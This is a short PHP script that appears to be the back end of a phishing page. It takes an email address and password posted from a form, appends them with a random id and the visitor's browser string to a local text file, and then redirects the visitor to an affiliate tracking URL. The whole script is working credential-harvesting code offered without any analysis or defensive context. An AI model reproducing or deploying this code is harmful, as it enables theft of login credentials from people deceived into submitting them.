<?php
header("Location: http://undercpa.com/tracking202/redirect/rtr.php?t202id=93862&c1=COK&c2=COK&c3=COK&c4=COK&t202ref=COK&t202kw=");
$ADEx = "./mk/ancor.txt";
$ran = rand(10,1000000000000);
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "$ran|$ADEy|$ADEz|$browser|$c");
fwrite($handle, "\n");
fclose($handle);
exit;
?>